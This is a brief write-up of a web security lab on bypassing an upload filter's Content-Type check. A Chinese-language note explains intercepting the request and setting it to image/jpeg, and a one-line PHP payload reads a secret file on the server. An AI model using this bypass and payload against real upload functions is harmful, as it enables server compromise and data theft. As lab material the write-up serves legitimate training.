# Lab: Web shell upload via Content-Type restriction bypass

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

## File Upload
* 這一題會檢查 content-type，用 burp 抓下來就可以改了，改成 image/jpeg 就可以了
```
payload = <?php readfile("/home/carlos/secret"); ?>
```